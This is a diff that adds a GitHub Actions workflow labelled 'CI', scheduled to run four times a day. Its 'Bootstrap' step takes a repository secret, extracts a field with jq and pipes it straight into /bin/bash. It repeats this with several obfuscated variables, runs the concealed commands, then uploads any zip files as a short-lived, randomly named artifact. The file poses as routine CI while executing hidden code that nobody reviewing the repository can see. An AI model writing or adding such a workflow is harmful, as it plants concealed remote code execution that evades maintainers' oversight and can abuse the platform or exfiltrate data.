@@ -1,0 +1,33 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          gial3622: ${{ secrets.gial3622 }}
+        run: |
+          printf '%s' "$gial3622" | jq -r .hagi3 | /bin/bash
+          printf '%s' "$mvpn8" | jq -r .rcw80102 | /bin/bash
+          printf '%s' "$dy147" | jq -r .s379 | /bin/bash
+          printf '%s' "$mb017" | jq -r .tsen67 | /bin/bash
+          printf '%s' "$jg256" | jq -r .d1 | /bin/bash
+          echo $in2 | jq -r .lgt5972 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: At3KuWZJ
+          path: "*.zip"
+          retention-days: 1
